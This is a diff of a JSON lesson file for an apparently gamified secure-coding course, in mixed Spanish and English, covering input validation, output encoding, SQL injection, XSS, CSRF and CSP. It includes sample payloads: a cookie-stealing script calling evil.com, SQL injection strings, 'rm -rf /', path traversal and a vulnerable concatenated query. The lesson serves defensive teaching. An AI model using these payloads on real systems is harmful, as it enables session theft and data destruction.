@@ -1,186 +1,318 @@
 {
   "id": "c4_l4",
-  "title": "Autenticación Segura",
-  "description": "Forensics Fundamentals",
+  "title": "Prácticas de codificación segura",
+  "description": "Input Validation & Output Encoding",
   "type": "interactive",
-  "duration_minutes": 9,
-  "xp_reward": 20,
+  "duration_minutes": 22,
+  "xp_reward": 55,
   "order_index": 4,
   "course_id": 4,
-  "total_screens": 3,
+  "total_screens": 17,
+  "theme": {
+    "primary_color": "#388E3C",
+    "secondary_color": "#FF6F00",
+    "accent_color": "#1976D2",
+    "gradient": ["#001a00", "#003300", "#004d00"]
+  },
   "screens": [
     {
       "screen_id": 1,
-      "type": "memory_cards",
-      "title": "Forensics Fundamentals",
-      "duration": 240,
+      "type": "story_intro",
+      "title": "Operación: Input Attack",
       "content": {
-        "cards": [
-          {
-            "id": "1",
-            "front": {
-              "icon": "fingerprint",
-              "term": "Chain of Custody",
-              "color": "#D32F2F"
-            },
-            "back": {
-              "definition": "Documented trail de evidence. Who collected, when, where, how stored, who accessed. Legal admissibility requires unbroken chain.",
-              "example": "Disk image: SHA256 hash at collection = verification later. USB write blocker to prevent tampering. Signed logs. Court will reject evidence con broken chain.",
-              "color": "#EF5350"
-            }
-          },
-          {
-            "id": "2",
-            "front": {
-              "icon": "save",
-              "term": "Forensic Imaging",
-              "color": "#1976D2"
-            },
-            "back": {
-              "definition": "Bit-for-bit copy de storage. Preserva deleted files, slack space, metadata. Never analyze original - work on copy. Tools: FTK Imager, dd, EnCase.",
-              "example": "Target breach: Image POS terminals antes de analysis. Original evidence preserved. DD command con hash verification.",
-              "color": "#42A5F5"
-            }
-          },
-          {
-            "id": "3",
-            "front": {
-              "icon": "memory",
-              "term": "Memory Forensics",
-              "color": "#F57C00"
-            },
-            "back": {
-              "definition": "Analyze RAM. Volatile data: running processes, network connections, encryption keys, credentials. Gone on shutdown. Capture ASAP.",
-              "example": "Volatility framework. BlackPOS lived in RAM scraping cards. Memory dump would show malicious process. Colonial: Should NOT power off for this reason.",
-              "color": "#FFB74D"
-            }
-          },
-          {
-            "id": "4",
-            "front": {
-              "icon": "timeline",
-              "term": "Timeline Analysis",
-              "color": "#388E3C"
-            },
-            "back": {
-              "definition": "Reconstruct events chronologically. File system timestamps (MAC: Modified, Accessed, Created), log entries, registry changes. Determine sequence.",
-              "example": "Target: When did breach start? Fazio credentials first use → Malware deployment → First card stolen → Discovery. Timeline = story.",
-              "color": "#66BB6A"
-            }
-          }
-        ]
+        "headline": "DEFENSIVE CODING",
+        "subheadline": "Never trust user input - validate, sanitize, encode",
+        "stats": [
+          {"value": "32%", "label": "Bugs from input handling"},
+          {"value": "XSS", "label": "#3 OWASP Top 10"},
+          {"value": "SQLi", "label": "#3 OWASP Top 10"}
+        ],
+        "cta_text": "Master Input Security"
       }
     },
     {
       "screen_id": 2,
-      "type": "progress_checklist",
-      "title": "Digital Forensics Process",
-      "duration": 240,
+      "type": "story_slide",
+      "title": "Trust Boundary",
       "content": {
-        "items": [
-          {
-            "id": "forensics1",
-            "task": "Identification & Preservation",
-            "subtitle": "Secure evidence",
-            "icon": "verified",
-            "unlock_content": {
-              "title": "First Steps",
-              "points": [
-                "Identify: What systems compromised? What data?",
-                "Photograph: Take photos of screen, cables, physical setup",
-                "Document: Notes with timestamps. Who did what when.",
-                "Preserve: Power on? Leave as-is. Capture RAM if still on.",
-                "Chain of custody: Start documentation trail immediately."
-              ],
-              "bonus_fact": "DO NOT power off ransomware-infected system until RAM captured. Encryption keys in memory."
-            }
-          },
-          {
-            "id": "forensics2",
-            "task": "Collection & Acquisition",
-            "subtitle": "Gather evidence",
-            "icon": "cloud_download",
-            "unlock_content": {
-              "title": "Data Collection",
-              "points": [
-                "Order of volatility: RAM → Network connections → Running processes → Disk → Logs → Archives",
-                "Live response: Capture volatile data before shutdown.",
-                "Disk imaging: Bit-for-bit copy with hash verification",
-                "Network capture: PCAPs if ongoing attack",
-                "Cloud: API-based collection, snapshots"
-              ],
-              "bonus_fact": "Mobile devices: Airplane mode immediately. Prevent remote wipe commands."
-            }
-          },
-          {
-            "id": "forensics3",
-            "task": "Analysis & Examination",
-            "subtitle": "Find the story",
-            "icon": "search",
-            "unlock_content": {
-              "title": "Deep Dive",
-              "points": [
-                "File system analysis: Deleted files recovery, hidden data",
-                "Log analysis: Event logs, web logs, database logs",
-                "Malware analysis: Static (strings, metadata) + Dynamic (sandbox)",
-                "Registry forensics (Windows): Persistence, user activity",
-                "Timeline reconstruction: Piece together sequence of events"
-              ],
-              "bonus_fact": "Anti-forensics techniques: Attackers timestomp, clear logs, encrypt. Hunter must adapt."
-            }
-          },
-          {
-            "id": "forensics4",
-            "task": "Reporting",
-            "subtitle": "Communicate findings",
-            "icon": "article",
-            "unlock_content": {
-              "title": "Documentation",
-              "points": [
-                "Executive summary: What happened, impact, recommendations",
-                "Technical details: Tools used, findings, evidence location",
-                "Timeline: Visual representation of attack",
-                "Chain of custody: Append to report",
-                "Legal language: May be used in court or regulatory response"
-              ],
-              "bonus_fact": "Good forensics report = clear, reproducible, legally sound. Technical pero understandable."
-            }
-          }
-        ]
+        "icon": "warning",
+        "icon_color": "#E53935",
+        "headline": "User Input = Attack Vector",
+        "body": "Every input es potential attack: Form fields, URL parameters, HTTP headers, cookies, file uploads. Attacker goal: Inject malicious code (SQL, JavaScript, OS commands). Defense: Trust boundary. External input = untrusted hasta proven safe. Validate input (whitelist approach). Encode output (context-aware). Never trust, always verify.",
+        "highlight_box": {
+          "type": "warning",
+          "text": "Golden rule: Validate INPUT (what comes in). Encode OUTPUT (what goes out). Context matters: SQL needs different encoding que HTML que JavaScript."
+        }
       }
     },
     {
       "screen_id": 3,
-      "type": "quiz",
-      "title": "Evaluación",
-      "duration": 60,
+      "type": "flip_card_full",
+      "title": "Input Validation",
       "content": {
-        "question": "¿Por qué forensic imaging antes de analysis?",
-        "options": [
-          {
-            "id": "a",
-            "text": "Más rápido analizar image que original",
-            "is_correct": false,
-            "feedback": "Incorrecto. Performance no es la razón principal."
-          },
-          {
-            "id": "b",
-            "text": "Preservar original evidence. Analysis puede alterar data. Chain of custody.",
-            "is_correct": true,
-            "feedback": "CORRECTO! 1) Preserve original: Any analysis alters timestamps, access logs. Original must remain pristine. 2) Chain of custody: Original stored securely. Work on verified copy. 3) Repeatability: Multiple analysts can work on separate copies. 4) Legal: Court requires original untampered. Hash verification proves copy integrity. Analogy: Crime scene photos - don't disturb crime scene, work from photos."
-          },
-          {
-            "id": "c",
-            "text": "Backups son más fáciles de analizar",
-            "is_correct": false,
-            "feedback": "Incorrecto. No es sobre backups sino evidence integrity."
+        "card": {
+          "front": {"icon": "rule", "term": "INPUT VALIDATION", "subtitle": "Whitelist approach", "color": "#388E3C"},
+          "back": {
+            "definition": "Verify input meets expected format BEFORE processing. Reject/sanitize invalid input. Whitelist (allow known-good) > Blacklist (block known-bad).",
+            "validation_types": ["Type: Is it integer cuando expect integer?", "Length: Max 50 chars para username", "Format: Email regex, phone number pattern", "Range: Age between 0-150", "Whitelist characters: [a-zA-Z0-9] only"],
+            "where": "Server-side (mandatory). Client-side (UX only, easily bypassed). Never trust client validation alone.",
+            "example": "Username field: Allow only alphanumeric + underscore. Max 20 chars. Reject: <script>, SQL keywords, special chars.",
+            "color": "#2E7D32"
           }
-        ]
+        }
+      }
+    },
+    {
+      "screen_id": 4,
+      "type": "flip_card_full",
+      "title": "Output Encoding",
+      "content": {
+        "card": {
+          "front": {"icon": "code", "term": "OUTPUT ENCODING", "subtitle": "Context-aware escaping", "color": "#1976D2"},
+          "back": {
+            "definition": "Encode/escape data BEFORE inserting into HTML, JavaScript, SQL, etc. Prevent interpretation as code. Context-dependent.",
+            "contexts": ["HTML: & → &amp;, < → &lt;, > → &gt;", "JavaScript: ' → \\'", "URL: space → %20", "SQL: ' → '' (o mejor: parameterized queries)", "CSS: Complex, avoid user input en CSS"],
+            "libraries": "Use frameworks: React (auto-escapes), Django (auto-escapes), OWASP Java Encoder. Don't roll your own.",
+            "xss_prevention": "XSS = attacker inject JavaScript. Output encoding prevents: <script> becomes &lt;script&gt; (displayed, not executed).",
+            "color": "#1565C0"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 5,
+      "type": "flip_card_full",
+      "title": "SQL Injection Defense",
+      "content": {
+        "card": {
+          "front": {"icon": "storage", "term": "SQL INJECTION", "subtitle": "Parameterized queries", "color": "#D32F2F"},
+          "back": {
+            "definition": "SQLi: Attacker inject SQL code vía input. Example: ' OR '1'='1 (auth bypass). Defense: Parameterized queries (prepared statements).",
+            "vulnerable_code": "query = 'SELECT * FROM users WHERE username=\\'' + input + \\'\\''  -- NEVER DO THIS",
+            "safe_code": "Parameterized: cursor.execute('SELECT * FROM users WHERE username=?', (input,)) -- DB treats input as DATA, not code",
+            "additional_defenses": ["Least privilege DB user (no DROP, DELETE unless needed)", "WAF (Web Application Firewall)", "Input validation (reject SQL keywords)", "ORM frameworks (abstraction layer)"],
+            "why_params_work": "Separate SQL structure from data. DB knows parameter is string literal, not SQL command.",
+            "color": "#C62828"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 6,
+      "type": "flip_card_full",
+      "title": "XSS: Cross-Site Scripting",
+      "content": {
+        "card": {
+          "front": {"icon": "code_off", "term": "XSS", "subtitle": "Inject malicious JavaScript", "color": "#F57C00"},
+          "back": {
+            "definition": "XSS: Attacker inject JavaScript into web pages viewed by other users. Steal cookies, session tokens, redirect, deface.",
+            "types": ["Reflected XSS: Input immediately echoed (URL parameter → page)", "Stored XSS: Input saved DB → displayed later (comment, profile)", "DOM-based XSS: Client-side JavaScript vulnerable"],
+            "example": "Comment field: <script>document.location='http://evil.com?cookie='+document.cookie</script> → Steal victim cookie",
+            "defense": ["Output encoding (HTML entity encoding)", "Content Security Policy (CSP headers)", "HTTPOnly cookies (no JavaScript access)", "Use frameworks with auto-escaping (React, Angular)"],
+            "color": "#EF6C00"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 7,
+      "type": "flip_card_full",
+      "title": "CSRF: Cross-Site Request Forgery",
+      "content": {
+        "card": {
+          "front": {"icon": "sync_problem", "term": "CSRF", "subtitle": "Forged requests", "color": "#7B1FA2"},
+          "back": {
+            "definition": "CSRF: Attacker tricks victim's browser into making authenticated request. Victim logged in → browser sends cookies automatically → action executed as victim.",
+            "example": "Victim logged into bank. Visits evil site. Evil site: <img src='https://bank.com/transfer?to=attacker&amount=1000'> → Browser sends request con victim's cookies.",
+            "defense": ["CSRF tokens: Random token per session/form. Validate server-side.", "SameSite cookie attribute: Cookie only sent para same-site requests", "Re-authentication para sensitive actions", "Check Referer header (weak, can be spoofed)"],
+            "token_implementation": "Generate random token, store session. Include en form (hidden field). Server validates token matches session.",
+            "color": "#6A1B9A"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 8,
+      "type": "drag_drop_match",
+      "title": "Attack → Defense Matching",
+      "content": {
+        "instruction": "Match el attack type con su primary defense:",
+        "scenarios": [
+          {"id": 1, "text": "SQL Injection: ' OR '1'='1 --", "correct_target": "params"},
+          {"id": 2, "text": "XSS: <script>alert(document.cookie)</script>", "correct_target": "encoding"},
+          {"id": 3, "text": "CSRF: Forged transfer request", "correct_target": "csrf_token"},
+          {"id": 4, "text": "Command Injection: ; rm -rf /", "correct_target": "validation"},
+          {"id": 5, "text": "Path Traversal: ../../etc/passwd", "correct_target": "whitelist"}
+        ],
+        "targets": [
+          {"id": "params", "label": "Parameterized Queries", "color": "#D32F2F"},
+          {"id": "encoding", "label": "Output Encoding", "color": "#1976D2"},
+          {"id": "csrf_token", "label": "CSRF Tokens", "color": "#7B1FA2"},
+          {"id": "validation", "label": "Input Validation", "color": "#388E3C"},
+          {"id": "whitelist", "label": "Whitelist Path", "color": "#F57C00"}
+        ],
+        "xp_per_correct": 7
+      }
+    },
+    {
+      "screen_id": 9,
+      "type": "flip_card_full",
+      "title": "Content Security Policy (CSP)",
+      "content": {
+        "card": {
+          "front": {"icon": "policy", "term": "CSP", "subtitle": "Browser security policy", "color": "#00897B"},
+          "back": {
+            "definition": "CSP: HTTP header tells browser what content sources son trusted. Defense against XSS, data injection. Browser blocks unauthorized scripts.",
+            "example_header": "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'",
+            "directives": ["default-src: Fallback para other directives", "script-src: Allowed JavaScript sources", "style-src: Allowed CSS sources", "img-src: Allowed image sources", "connect-src: Allowed AJAX/WebSocket"],
+            "inline_scripts": "CSP blocks inline scripts (<script>...</script>) by default. Use nonce o hash. Or external .js files.",
+            "benefits": "Even si XSS payload injected, CSP blocks execution si source not whitelisted. Defense in depth.",
+            "color": "#00796B"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 10,
+      "type": "swipe_cards",
+      "title": "Secure Code Practice?",
+      "content": {
+        "instruction": "¿Es esta práctica segura?",
+        "cards": [
+          {"id": 1, "scenario": "SQL query: 'SELECT * FROM users WHERE id=' + user_input", "correct_answer": "left", "labels": {"left": "❌ VULNERABLE", "right": "✅ SEGURA"}},
+          {"id": 2, "scenario": "Use parameterized queries con prepared statements", "correct_answer": "right", "labels": {"left": "❌ VULNERABLE", "right": "✅ SEGURA"}},
+          {"id": 3, "scenario": "Display user input sin encoding: innerHTML = user_comment", "correct_answer": "left", "labels": {"left": "❌ VULNERABLE", "right": "✅ SEGURA"}},
+          {"id": 4, "scenario": "Validate input server-side + encode output context-aware", "correct_answer": "right", "labels": {"left": "❌ VULNERABLE", "right": "✅ SEGURA"}},
+          {"id": 5, "scenario": "CSRF protection: Check Referer header only", "correct_answer": "left", "labels": {"left": "❌ VULNERABLE", "right": "✅ SEGURA"}}
+        ],
+        "xp_per_correct": 9
+      }
+    },
+    {
+      "screen_id": 11,
+      "type": "flip_card_full",
+      "title": "Least Privilege Principle",
+      "content": {
+        "card": {
+          "front": {"icon": "lock", "term": "LEAST PRIVILEGE", "subtitle": "Minimum permissions needed", "color": "#FF6F00"},
+          "back": {
+            "definition": "Code/user should have ONLY minimum permissions necessary. Reduce blast radius si compromised.",
+            "examples": ["DB user: App needs SELECT/INSERT → NO DROP, DELETE privileges", "File system: App writes logs → NO read/execute /etc/passwd", "API keys: Read-only key para analytics, not admin key", "Process: Run as non-root user (not UID 0)"],
+            "defense_in_depth": "Even si SQLi successful, attacker limited by DB user permissions. Least privilege = damage control.",
+            "implementation": "Role-based access. Service accounts con scoped permissions. Regular access reviews.",
+            "color": "#F57C00"
+          }
+        }
+      }
+    },
+    {
+      "screen_id": 12,
+      "type": "slider_balance",
+      "title": "⚖️ Validación de Input",
+      "content": {
+        "scenario": "Validando nombres de usuario. ¿Qué política aplicas?",
+        "left_option": {
+          "label": "Permisiva (Lista Negra)",
+          "icon": "rule",
+          "consequences": [
+            "✅ Acepta nombres raros",
+            "❌ Difícil bloquear todos los ataques",
+            "❌ Riesgo de XSS/SQLi alto"
+          ]
+        },
+        "right_option": {
+          "label": "Estricta (Lista Blanca)",
+          "icon": "verified_user",
+          "consequences": [
+            "✅ Solo permite lo conocido seguro",
+            "✅ Elimina clases enteras de ataques",
+            "❌ Puede rechazar entradas válidas (falsos positivos)"
+          ]
+        },
+        "explanation": "Siempre usa Lista Blanca (Allowlist). Es imposible predecir todo lo malo (Blacklist), pero es fácil definir lo bueno (a-z, 0-9)."
+      }
+    },
+    {
+      "screen_id": 13,
+      "type": "log_hunter",
+      "title": "🔍 Hunt: SQL Injection Attempt",
+      "content": {
+        "scenario": "Web app logs. Find las 2 lines que indican SQL injection attack.",
+        "log_lines": [
+          {"id": 1, "text": "2024-12-01 14:23:11 POST /login username=john.doe password=****** result=success", "is_suspicious": false},
+          {"id": 2, "text": "2024-12-01 18:45:33 POST /login username=admin' OR '1'='1'-- password=x result=error", "is_suspicious": true, "reason": "Classic SQLi payload: OR '1'='1' (always true) + -- (comment out rest). Auth bypass attempt"},
+          {"id": 3, "text": "2024-12-01 19:02:15 GET /search?q=laptops result=success rows=15", "is_suspicious": false},
+          {"id": 4, "text": "2024-12-01 20:33:44 GET /product?id=5 UNION SELECT username,password FROM users-- result=error", "is_suspicious": true, "reason": "UNION-based SQLi: Attempt extract users table via UNION query. Data exfiltration technique"},
+          {"id": 5, "text": "2024-12-01 21:15:42 POST /comment content='Great product!' result=success", "is_suspicious": false}
+        ],
+        "xp_reward": 25
+      }
+    },
+    {
+      "screen_id": 14,
+      "type": "timed_quiz",
+      "title": "⚡ Defense Priority",
+      "content": {
+        "timer_seconds": 30,
+        "question": "¿Cuál es MÁS efectivo contra SQL injection?",
+        "options": [
+          {"id": "a", "text": "Input validation (block SQL keywords)", "is_correct": false},
+          {"id": "b", "text": "Parameterized queries (prepared statements)", "is_correct": true},
+          {"id": "c", "text": "WAF (Web Application Firewall)", "is_correct": false}
+        ],
+        "explanation": "Parameterized queries = gold standard. Separate SQL structure from data. DB treats input as literal string, never as code. Input validation helpful (defense in depth) pero can be bypassed. WAF = external layer, parameterized = source fix.",
+        "xp_reward": 20
+      }
+    },
+    {
+      "screen_id": 15,
+      "type": "timed_quiz",
+      "title": "⚡ Output Encoding Context",
+      "content": {
+        "timer_seconds": 25,
+        "question": "Why context-aware encoding critical?",
+        "options": [
+          {"id": "a", "text": "HTML encoding works en ALL contexts", "is_correct": false},
+          {"id": "b", "text": "Different contexts (HTML, JS, SQL, URL) require different encoding rules", "is_correct": true},
+          {"id": "c", "text": "Encoding performance varies by context", "is_correct": false}
+        ],
+        "explanation": "Context matters: HTML needs &lt; &gt;. JavaScript needs \\'. URL needs %20. SQL needs '' o better parameterized. Single encoding scheme insufficient. Use context-appropriate libraries (OWASP Encoder).",
+        "xp_reward": 20
+      }
+    },
+    {
+      "screen_id": 16,
+      "type": "achievement_unlock",
+      "title": "Logro Desbloqueado",
+      "content": {
+        "achievement": {
+          "icon": "verified_user",
+          "name": "Secure Code Ninja",
+          "description": "Master input validation & output encoding",
+          "rarity": "rare",
+          "color": "#388E3C"
+        }
+      }
+    },
+    {
+      "screen_id": 17,
+      "type": "lesson_complete",
+      "title": "Lección Completada",
+      "content": {
+        "xp_earned": 55,
+        "key_takeaways": [
+          "Golden rule: Validate INPUT (whitelist approach). Encode OUTPUT (context-aware).",
+          "SQL Injection defense: Parameterized queries (prepared statements). Separate code from data.",
+          "XSS prevention: Output encoding (HTML entities). CSP headers. HTTPOnly cookies.",
+          "CSRF defense: CSRF tokens per form/session. SameSite cookies.",
+          "Least privilege: Minimum permissions. Even si exploited, damage limited."
+        ],
+        "next_lesson": {
+          "id": "c4_l5",
+          "title": "API Security",
+          "preview": "OWASP API Top 10, authentication, rate limiting"
+        }
       }
     }
-  ],
-  "success": true,
-  "content": {
-    "intro": ""
-  }
+  ]
 }
